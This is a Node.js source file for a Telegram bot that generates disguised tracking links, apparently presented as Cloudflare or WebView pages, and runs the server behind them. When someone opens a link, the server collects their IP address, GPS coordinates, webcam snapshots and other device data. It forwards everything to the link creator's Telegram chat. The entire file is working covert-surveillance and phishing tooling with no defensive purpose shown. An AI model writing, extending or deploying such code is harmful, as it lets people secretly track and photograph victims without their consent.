require('dotenv').config();
const fs = require("fs");
const express = require("express");
var cors = require('cors');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const botToken = process.env.TELEGRAM_BOT_TOKEN || process.env["bot"];
if(!botToken){
  console.error("ERROR: TELEGRAM_BOT_TOKEN (or bot) environment variable is required.");
  process.exit(1);
}
const bot = new TelegramBot(botToken, {polling: true});

const app = express();
// Use express built-in parsers (replaces body-parser)
app.use(express.json({limit:1024*1024*20}));
app.use(express.urlencoded({ extended:true,limit:1024*1024*20 }));
app.use(cors());
app.set("view engine", "ejs");

// Configure via environment variables
const hostURL = process.env.HOST_URL || "https://track-down-link--telenah3ed.replit.app";
const PORT = process.env.PORT || 5000;
var use1pt = (process.env.USE_1PT === 'true') || false;
const SESSION_TTL = parseInt(process.env.SESSION_TTL_MS || (2 * 60 * 1000), 10); // default 2 minutes

// Node-safe base64 helpers (replaces browser btoa/atob)
const atob = (s) => {
  try { return Buffer.from(String(s || ''), 'base64').toString('utf8'); }
  catch (e) { return ''; }
};
const btoa = (s) => Buffer.from(String(s || ''), 'utf8').toString('base64');

// Simple in-memory session store for tracking creation flow
// NOTE: in-memory store resets when process restarts. For production use a persistent store.
const sessions = new Map();

function setSession(chatId, session){
  session.expiresAt = Date.now() + SESSION_TTL;
  sessions.set(String(chatId), session);
}
function getSession(chatId){
  const s = sessions.get(String(chatId));
  if(!s) return null;
  if(s.expiresAt && s.expiresAt < Date.now()){
    sessions.delete(String(chatId));
    return null;
  }
  return s;
}
function clearSession(chatId){
  sessions.delete(String(chatId));
}
// periodic cleanup
setInterval(()=>{
  const now = Date.now();
  for(const [k,v] of sessions){
    if(v.expiresAt && v.expiresAt < now) sessions.delete(k);
  }
}, 60*1000);

// Helper: validate URL strictly (only http/https) and length
function isValidUrl(s){
  if(!s || typeof s !== 'string') return false;
  if(s.length > 2000) return false; // too long
  try{
    const u = new URL(s);
    return u.protocol === 'http:' || u.protocol === 'https:';
  }catch(e){
    return false;
  }
}

// Begin bot flow
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  if(msg.from?.is_bot) return;

  const session = getSession(chatId);

  // If user is expected to send a URL as part of creation flow
  if(session && session.state === 'awaiting_url'){
    // only accept text messages for URL
    if(typeof msg.text !== 'string'){
      const tries = (session.tries || 0) + 1;
      session.tries = tries;
      setSession(chatId, session);
      if(tries >= 3){
        clearSession(chatId);
        bot.sendMessage(chatId, 'No valid text URL received. Creation flow canceled. Use /create to start again.');
      } else {
        bot.sendMessage(chatId, 'Please send the destination URL as a text message (include http:// or https://).');
      }
      return;
    }

    const text = msg.text.trim();
    if(!isValidUrl(text)){
      // invalid input - prompt again but be friendly
      const tries = (session.tries || 0) + 1;
      session.tries = tries;
      setSession(chatId, session);
      if(tries >= 3){
        clearSession(chatId);
        bot.sendMessage(chatId, 'Multiple invalid URLs received. Creation flow canceled. Use /create to start again.');
      } else {
        bot.sendMessage(chatId, 'That doesn\'t look like a valid URL. Make sure it starts with http:// or https:// and isn\'t too long, then try again.');
      }
      return;
    }

    // valid URL - save and ask user to choose link type
    const uid = chatId.toString(36);
    const encoded = btoa(text);
    session.state = 'choose_type';
    session.data = { url: text, uid, encoded };
    setSession(chatId, session);

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [ { text: '🌐 Cloudflare Link', callback_data: 'choose:cloudflare' }, { text: '🖼️ WebView Link', callback_data: 'choose:webview' } ],
          [ { text: '🔗 Both Links', callback_data: 'choose:both' } ],
          [ { text: '❌ Cancel', callback_data: 'choose:cancel' } ]
        ]
      }
    };

    bot.sendMessage(chatId, 'URL accepted. Choose which kind of link you want to create:', keyboard);
    return;
  }

  // fallback existing commands
  if(msg.text === '/start'){
    const m={
      reply_markup:{
        inline_keyboard:[[
          {text:"➕ Create Link",callback_data:"crenew"},
          {text:"❓ Help",callback_data:"help"}
        ]]
      }
    };
    bot.sendMessage(chatId, `Welcome ${msg.chat.first_name || ''}!\nUse the Create Link button to start.` , m);
    return;
  }

  if(msg.text === '/create'){
    createNew(chatId);
    return;
  }

  if(msg.text === '/help'){
    bot.sendMessage(chatId, `Help: send /create to start the link creation flow. Follow prompts and select the link type when asked.`);
    return;
  }

  // otherwise ignore or send a hint
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id).catch(()=>{});
  const chatId = callbackQuery.from.id;
  const data = callbackQuery.data;

  if(data === 'crenew'){
    createNew(chatId);
    return;
  }
  if(data === 'help'){
    bot.sendMessage(chatId, 'Send /create to start. The bot will ask for a target URL and then provide tracking links.');
    return;
  }

  if(data && data.startsWith('choose:')){
    const action = data.split(':')[1];
    const session = getSession(chatId);
    if(!session || session.state !== 'choose_type' || !session.data){
      bot.sendMessage(chatId, 'No active creation session found or it expired. Use /create to start again.');
      return;
    }

    if(action === 'cancel'){
      clearSession(chatId);
      bot.sendMessage(chatId, 'Creation flow canceled.');
      return;
    }

    const { url, uid, encoded } = session.data;
    const cUrl = `${hostURL}/c/${uid}/${encoded}`;
    const wUrl = `${hostURL}/w/${uid}/${encoded}`;

    // generate and send according to choice
    if(action === 'cloudflare'){
      await sendLinks(chatId, url, { cloudflare: cUrl });
    } else if(action === 'webview'){
      await sendLinks(chatId, url, { webview: wUrl });
    } else if(action === 'both'){
      await sendLinks(chatId, url, { cloudflare: cUrl, webview: wUrl });
    } else {
      bot.sendMessage(chatId, 'Unknown action.');
    }

    clearSession(chatId);
    return;
  }
});

bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});

async function sendLinks(cid, originalUrl, { cloudflare=null, webview=null } = {}){
  bot.sendChatAction(cid, 'typing');
  const m={ reply_markup:{ inline_keyboard:[[ {text:"➕ Create new Link",callback_data:"crenew"} ]] } };

  if(use1pt){
    try{
      let text = `New links have been created successfully.\nURL: ${originalUrl}\n\n✅Your Links\n\n`;
      if(cloudflare){
        const x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cloudflare)}`).then(res => res.json());
        for(const k in x) text += `${x[k]}\n`;
        text += '\n';
      }
      if(webview){
        const y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(webview)}`).then(res => res.json());
        for(const k in y) text += `${y[k]}\n`;
      }
      bot.sendMessage(cid, text, m);
    }catch(err){
      console.error('Shortener error:', err);
      // fallback
      let text = `New links created (shortener failed).\nURL: ${originalUrl}\n\n`;
      if(cloudflare) text += `Cloudflare: ${cloudflare}\n`;
      if(webview) text += `WebView: ${webview}\n`;
      bot.sendMessage(cid, text, m);
    }
  } else {
    let text = `New links have been created successfully.\nURL: ${originalUrl}\n\n✅Your Links\n\n`;
    if(cloudflare) text += `🌐 CloudFlare Page Link\n${cloudflare}\n\n`;
    if(webview) text += `🌐 WebView Page Link\n${webview}\n\n`;
    bot.sendMessage(cid, text, m);
  }
}

function createNew(cid){
  // start a new creation session
  setSession(cid, { state: 'awaiting_url', tries: 0 });
  const msg = '🌐 Enter the destination URL (include http:// or https://).\nExample: https://example.com';
  bot.sendMessage(cid, msg, { reply_markup: { force_reply: true } }).catch(()=>{});
}

// --- HTTP routes --- (kept mostly as originally implemented, but with safer parsing)
app.get("/w/:path/:uri",(req,res)=>{
  var ip;
  var d = new Date();
  d=d.toJSON().slice(0,19).replace('T',':');
  if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.socket && req.socket.remoteAddress ? req.socket.remoteAddress : "";}

  if(req.params.path != null){
    let decodedUrl = atob(req.params.uri);
    res.render("webview",{ip:ip,time:d,url:decodedUrl,uid:req.params.path,a:hostURL,t:use1pt});
  } else{
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

app.get("/c/:path/:uri",(req,res)=>{
  var ip;
  var d = new Date();
  d=d.toJSON().slice(0,19).replace('T',':');
  if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.socket && req.socket.remoteAddress ? req.socket.remoteAddress : "";}

  if(req.params.path != null){
    let decodedUrl = atob(req.params.uri);
    res.render("cloudflare",{ip:ip,time:d,url:decodedUrl,uid:req.params.path,a:hostURL,t:use1pt});
  } else{
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.socket && req.socket.remoteAddress ? req.socket.remoteAddress : "";}
  res.json({"ip":ip});
});

app.post("/location",(req,res)=>{
  try{
    const lat = req.body.lat != null ? parseFloat(req.body.lat) : null;
    const lon = req.body.lon != null ? parseFloat(req.body.lon) : null;
    const uid = req.body.uid != null ? String(req.body.uid) : null;
    const acc = req.body.acc != null ? String(req.body.acc) : null;

    if(lon != null && lat != null && uid != null && acc != null){
      const toId = parseInt(uid,36);
      if(Number.isNaN(toId)) return res.status(400).send('Invalid uid');
      bot.sendLocation(toId,lat,lon).catch(()=>{});
      bot.sendMessage(toId,`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`).catch(()=>{});
      res.send("Done");
    } else {
      res.status(400).send("Missing parameters");
    }
  }catch(e){
    console.error('Error in /location:', e);
    res.status(400).send('Bad request');
  }
});

app.post("/receive-sms", (req, res) => {
  // convenience endpoint for integrations that post JSON { uid, data }
  try{
    const uid = req.body.uid;
    const data = req.body.data;
    if(!uid || !data) return res.status(400).send('missing');
    const toId = parseInt(uid,36);
    if(Number.isNaN(toId)) return res.status(400).send('invalid uid');
    bot.sendMessage(toId, data).catch(()=>{});
    return res.send('ok');
  }catch(e){
    console.error('Error forwarding message:', e);
    return res.status(500).send('error');
  }
});

app.post("/",(req,res)=>{
  try{
    const uidRaw = req.body.uid;
    const dataRaw = req.body.data;
    const uid = uidRaw != null ? String(uidRaw) : null;
    const data = dataRaw != null ? String(dataRaw) : null;

    var ip;
    if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.socket && req.socket.remoteAddress ? req.socket.remoteAddress : "";}

    if( uid != null && data != null){
      if(data.indexOf(ip) < 0){
        return res.send("ok");
      }

      const cleaned = data.replaceAll("<br>","\n");
      const toId = parseInt(uid,36);
      if(Number.isNaN(toId)) return res.status(400).send('invalid uid');
      bot.sendMessage(toId,cleaned,{parse_mode:"HTML"}).catch(()=>{});
      res.send("Done");
    } else {
      res.status(400).send('Missing parameters');
    }
  }catch(e){
    console.error('Error in /:', e);
    res.status(400).send('Bad request');
  }
});

app.post("/camsnap",(req,res)=>{
  try{
    const uidRaw = req.body.uid;
    const imgRaw = req.body.img;
    const uid = uidRaw != null ? String(uidRaw) : null;
    const img = imgRaw != null ? String(imgRaw) : null;

    if( uid != null && img != null){
      const buffer=Buffer.from(img,'base64');
      const info={ filename:"camsnap.png", contentType: 'image/png' };
      try {
        const toId = parseInt(uid,36);
        if(Number.isNaN(toId)) return res.status(400).send('invalid uid');
        bot.sendPhoto(toId,buffer,{},info).catch((e)=>{ console.error('sendPhoto error', e); });
      } catch (error) {
        console.log(error);
      }
      res.send("Done");
    } else {
      res.status(400).send('Missing parameters');
    }
  }catch(e){
    console.error('Error in /camsnap:', e);
    res.status(400).send('Bad request');
  }
});

app.listen(PORT, () => {
  console.log(`App Running on Port ${PORT}!`);
});
